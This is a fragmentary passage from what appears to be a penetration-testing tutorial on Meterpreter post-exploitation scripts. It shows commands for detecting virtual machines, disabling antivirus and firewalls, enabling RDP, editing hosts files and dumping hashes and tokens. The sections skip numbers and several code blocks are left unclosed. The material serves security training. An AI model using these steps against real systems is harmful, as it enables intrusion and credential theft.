# 1 - Metasploit Scripts

a11y.text Metasploit Scripts

Metasploit comes with a ton of useful scripts that can aid you in the Metasploit Framework. These scripts are typically made by third parties and eventually adopted into the subversion repository. Weâ€™ll run through some of them and walk you through how you can use them in your own penetration test.

The scripts mentioned below are intended to be used with a Meterpreter shell after the successful compromise of a target. Once you have gained a session with the target you can use these scripts to best suit your needs.

# 2 - checkvm

The checkvm script, as its name suggests, checks to see if you exploited a virtual machine. This information can be very useful.

```
meterpreter > run checkvm

[*] Checking if SSHACKTHISBOX-0 is a Virtual Machine ........
[*] This is a VMware Workstation/Fusion Virtual Machine
```

# 3 - getcountermeasure

a11y.text getcountermeasure

The getcountermeasure script checks the security configuration on the victims system and can disable other security measures such as A/V, Firewall, and much more.

```
meterpreter > run getcountermeasure

[*] Running Getcountermeasure on the target...
[*] Checking for contermeasures...
[*] Getting Windows Built in Firewall configuration...
[*]
[*]     Domain profile configuration:
[*]     -------------------------------------------------------------------
[*]     Operational mode                  = Disable

# 4 - getgui

The getgui script is used to enable RDP on a target system if it is disabled.

```
meterpreter > run getgui

# 7 - hostsedit

The hostsedit Meterpreter script is for adding entries to the Windows hosts file. Since Windows will check the hosts file first instead of the configured DNS server, it will assist in diverting traffic to a fake entry or entries. Either a single entry can be provided or a series of entries can be provided with a file containing one entry per line.

```
meterpreter > run hostsedit

[!] Meterpreter scripts are deprecated. Try post/windows/manage/inject_host.
[!] Example: run post/windows/manage/inject_host OPTION=value [...]

From our examples above we can see that there are plenty of Meterpreter scripts for us to enumerate a ton of information, disable anti-virus for us, enable RDP, and much much more.

# 11 - winenum

The winenum script makes for a very detailed windows enumeration tool. It dumps tokens, hashes and much more.
